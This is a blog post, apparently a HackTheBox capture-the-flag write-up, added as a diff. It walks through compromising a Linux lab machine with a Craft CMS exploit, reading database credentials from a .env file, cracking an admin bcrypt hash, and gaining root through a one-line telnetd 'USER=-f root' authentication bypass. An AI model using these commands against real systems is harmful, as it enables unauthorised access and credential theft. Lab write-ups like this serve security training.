@@ -1,0 +1,203 @@
+---
+title: 'Orion Machine (HackTheBox) — Step-by-Step Walkthrough'
+date: '2026-08-14'
+draft: false
+locked: true
+lockedMessage: 'This machine is currently active on HackTheBox. The full writeup will be published once it retires.'
+tags: ['hackthebox', 'linux', 'Machine', 'very-easy', 'craftcms', 'rce', 'sql-database', 'telnet']
+summary: 'Orion is a Linux machine compromised via a Craft CMS 5.6.16 RCE exploit for initial access as www-data, followed by credential extraction from a leaked .env file, database enumeration for a crackable admin hash, and privilege escalation to root through CVE-2026-24061, an authentication bypass in telnetd via a spoofed USER environment variable.'
+images: ['/static/images/orion/preview.png']
+---
+
+## Table of Contents
+
+## Summary
+
+Orion is an Easy-difficulty Linux machine built around a Craft CMS 5.6.16 instance exposed on port 80. Enumeration of the site revealed the CMS and version, which had a known exploit available in Metasploit, giving initial access as `www-data`. From there, a `.env` file in the Craft installation directory leaked database credentials, which I used to connect directly to the backend MySQL instance and dump the `users` table. The extracted admin password hash cracked via `hashcat` against `rockyou.txt`, yielding valid SSH credentials for the `adam` user and the user flag.
+
+Post-exploitation port enumeration on the box showed two additional services — MySQL (3306) and Telnet (23) — both bound to loopback only. Local port forwarding over SSH exposed these to my attack host, and researching the Telnet service pointed to CVE-2026-24061, a `telnetd` auto-login flaw. Passing a crafted `USER` environment variable (`USER='-f root'`) alongside the `-a` flag exploited this trust issue, bypassing authentication entirely and dropping a root shell — completing the box.
+
+## Machine Info
+
+| Target IP        | 10.129.8.209  |
+| ---------------- | ------------- |
+| Difficulty Level | **Very Easy** |
+| OS               | **Linux**     |
+
+---
+
+## Nmap Scan
+
+```bash
+$ nmap -sCV 10.129.8.209
+```
+
+![Nmap Scan](/static/images/orion/image.png)
+
+I added the domain and IP to my `/etc/hosts` file:
+
+```bash
+$ echo "10.129.8.209   orion.htb" | sudo tee -a /etc/hosts
+```
+
+## Port 80
+
+Port 80 leads to a telecom service website.
+
+![image.png](/static/images/orion/image%201.png)
+
+Poking around the site, I found it was powered by Craft CMS.
+
+### Craft CMS
+
+Craft CMS is a flexible, developer-friendly content management system built on PHP. It gives developers a blank canvas for building custom, high-performance sites without locking them into rigid templates or pre-made themes.
+
+Nothing else on the front end stood out, so I moved on to directory enumeration.
+
+### Directory Enumeration with `gobuster`
+
+```bash
+$ gobuster dir -u "http://orion.htb/" -w /snap/seclists/current/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+```
+
+![image.png](/static/images/orion/image%202.png)
+
+This turned up `http://orion.htb/admin/login`. I didn't have credentials, so I tried `admin:admin` — no luck. The login page did, however, disclose the CMS version: **Craft CMS 5.6.16**. That gave me a clear next step: check whether this version has any known vulnerabilities.
+
+![image.png](/static/images/orion/image%203.png)
+
+## Initial Access
+
+I searched for a matching exploit in `msfconsole`.
+
+![image.png](/static/images/orion/image%204.png)
+
+I set the following options:
+
+![image.png](/static/images/orion/image%205.png)
+
+Running the exploit landed me a shell.
+
+![image.png](/static/images/orion/image%206.png)
+
+### Spawning a PTY Shell
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@orion:~/html/craft/web$
+```
+
+While exploring the filesystem, I found a `.env` file under `/html/craft`:
+
+```bash
+www-data@orion:~/html/craft$ ls -la
+ls -la
+total 364
+drwxrwxr-x  7 www-data www-data   4096 Mar  6 11:22 .
+drwxr-xr-x  3 root     root       4096 Mar  6 11:19 ..
+-rw-rw-r--  1 www-data www-data    718 Mar  6 11:24 .env
+-rw-rw-r--  1 www-data www-data    411 Nov 18  2025 .env.example.dev
+-rw-rw-r--  1 www-data www-data    623 Nov 18  2025 .env.example.production
+-rw-rw-r--  1 www-data www-data    619 Nov 18  2025 .env.example.staging
+-rw-rw-r--  1 www-data www-data     31 Nov 18  2025 .gitignore
+-rw-rw-r--  1 www-data www-data    624 Nov 18  2025 bootstrap.php
+-rw-rw-r--  1 www-data www-data    611 Mar  6 11:20 composer.json
+-rw-rw-r--  1 www-data www-data 310507 Mar  6 11:20 composer.lock
+drwxrwxr-x  4 www-data www-data   4096 Mar  6 11:26 config
+-rwxr-xr-x  1 www-data www-data    309 Nov 18  2025 craft
+drwxrwxr-x  5 www-data www-data   4096 Mar  6 11:24 storage
+drwxrwxr-x  2 www-data www-data   4096 Mar 10 10:46 templates
+drwxrwxr-x 49 www-data www-data   4096 Mar  6 11:20 vendor
+drwxrwxr-x  4 www-data www-data   4096 Mar  7 15:31 web
+```
+
+Inside the `.env` file were the database credentials.
+
+![image.png](/static/images/orion/image%207.png)
+
+## Connecting to the Database
+
+Using the credentials extracted from the `.env` file, I connected to the database to harvest further information that might help me escalate to the `adam` user.
+
+```bash
+mysql -u root -pSuperSecureCraft123Pass! -h 127.0.0.1
+```
+
+![image.png](/static/images/orion/image%208.png)
+
+I selected the `orion` database to investigate further.
+
+![image.png](/static/images/orion/image%209.png)
+
+It contained several tables. I focused on the `users` table and ran a query to pull only the relevant fields:
+
+![image.png](/static/images/orion/image%2010.png)
+
+```
+username: admin
+password hash: $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+email: adam@orion.htb
+```
+
+## Hash Cracking
+
+```bash
+$ echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
+$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+The hash cracked to: **`darkangel`**
+
+## SSH Connection
+
+```bash
+$ ssh adam@10.129.8.209
+```
+
+## User Flag
+
+![image.png](/static/images/orion/image%2011.png)
+
+## Privilege Escalation → Root
+
+I started by checking for open ports.
+
+```bash
+adam@orion:~$ ss -tulnp
+Netid          State           Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port          Process
+udp            UNCONN          0               0                        127.0.0.53%lo:53                          0.0.0.0:*
+udp            UNCONN          0               0                              0.0.0.0:68                          0.0.0.0:*
+tcp            LISTEN          0               80                           127.0.0.1:3306                        0.0.0.0:*
+tcp            LISTEN          0               4096                     127.0.0.53%lo:53                          0.0.0.0:*
+tcp            LISTEN          0               10                           127.0.0.1:23                          0.0.0.0:*
+tcp            LISTEN          0               511                            0.0.0.0:80                          0.0.0.0:*
+tcp            LISTEN          0               128                            0.0.0.0:22                          0.0.0.0:*
+tcp            LISTEN          0               128                               [::]:22                             [::]:*
+```
+
+The machine was listening locally on ports **3306** and **23**, both bound to loopback only. To reach them, I set up local port forwarding over my existing SSH session.
+
+I focused on port 23 (Telnet) first, since it's historically prone to weak authentication. Research turned up **CVE-2026-24061**, and I found an Offensive Security article walking through a proof of concept, which I replicated here.
+
+Reference: https://www.offsec.com/blog/cve-2026-24061/
+
+![image.png](/static/images/orion/image%2012.png)
+
+## Root Flag
+
+The vulnerability allowed authentication bypass via the `-a` auto-login flag combined with a crafted `USER` environment variable, which the vulnerable `telnetd` trusted without verifying credentials:
+
+```bash
+adam@orion:~$ USER='-f root' telnet -a 127.0.0.1
+```
+
+![image.png](/static/images/orion/image%2013.png)
+
+```bash
+root@orion:~# cat root.txt
+1d007d0442dd3c******************
+```
+
+---
+
+![image.png](/static/images/orion/image%2014.png)
